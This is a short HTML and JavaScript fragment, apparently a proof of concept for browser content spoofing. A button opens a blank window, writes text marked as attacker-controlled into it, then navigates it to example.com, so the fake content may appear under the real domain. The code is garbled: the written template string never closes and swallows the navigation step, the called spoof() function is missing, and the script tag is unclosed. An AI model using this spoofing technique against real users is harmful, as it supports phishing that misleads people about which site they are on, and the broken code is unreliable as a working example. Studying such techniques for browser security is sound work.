  <button onclick="spoof()">Open</button>

<script>

  w = window.open("about:blank", "spoof");

  // 2. Write attacker-controlled content
  w.document.write(`
    <h2>This page is NOT example.com</h2>
    <p>Content is attacker-controlled</p>

  // 3. Trigger navigation to target domain

    w.location.href = "https://example.com";
